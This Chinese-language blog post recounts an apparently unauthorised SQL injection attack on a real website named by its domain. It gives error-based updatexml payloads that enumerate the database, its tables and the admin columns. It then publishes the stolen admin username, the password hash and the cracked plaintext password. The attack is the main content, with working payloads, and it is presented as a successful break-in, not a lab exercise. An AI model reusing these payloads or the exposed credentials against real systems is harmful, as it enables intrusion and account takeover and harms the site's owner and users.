sql注入之getshell

发表于 2018-12-15 | 分类于 GETSHELL

最近搞到一个小站，拿出来分享一下。

0x01

说下思路，找到一个叫www.scps168.com的网站，通过一顿乱……发现注入点，那就进行sql之旅吧

姿势一：报错注入获得数据库用户名

得到数据库用户名：root@localhost

姿势二：爆破数据库

得到：scps168

姿势三：

爆表:

payload:http://scps168.com/product/html/?43' and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='scps168' limit 10,1),0x7e),1))--+.html

表名：

  • pwn_advs_duilian
  • pwn_advs_lb
  • pwn_advs_lbgroup
  • pwn_advs_link
  • pwn_advs_linkgroup
  • pwn_advs_logo
  • pwn_advs_movi
  • pwn_advs_pic
  • pwn_advs_pop
  • pwn_advs_text
  • pwn_base_admin（管理员）
  • pwn_base_adminauth
  • pwn_base_adminmenu
  • pwn_base_adminrights
  • pwn_base_border
  • pwn_base_coltype
  • pwn_base_config
  • pwn_base_pageset
  • pwn_base_pagetemp
  • pwn_base_plus
  • pwn_base_plusdefault
  • pwn_base_plusplanid
  • pwn_base_plustemp
  • pwn_base_version
  • pwn_comment
  • pwn_comment_cat
  • pwn_comment_config
  • pwn_member
  • pwn_member_cat
  • pwn_member_centlog
  • pwn_member_centrule
  • pwn_member_centset

第四步：进行列名猜解

payload:http://scps168.com/product/html/?43' and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='pwn_base_admin' limit 0,1),0x7e),1))--+.html

列名：

  • id
  • user(用户名)
  • password（密码）
  • name
  • job

第五步：获取列的内容

payload:

http://scps168.com/product/html/?43' and (updatexml(1,concat(0x7e,(select user from pwn_base_admin limit 0,1),0x7e),1))--+.html（获取用户名）

用户名：yiding1666

通过同样的方式构造payload,获取password,得到密码

1aaa2a1c894f404fbf20959ab227d43（再进行md5解密，你会发现少1位，后面补齐1位数字，都行）

最后得到密码：qazwsx1234
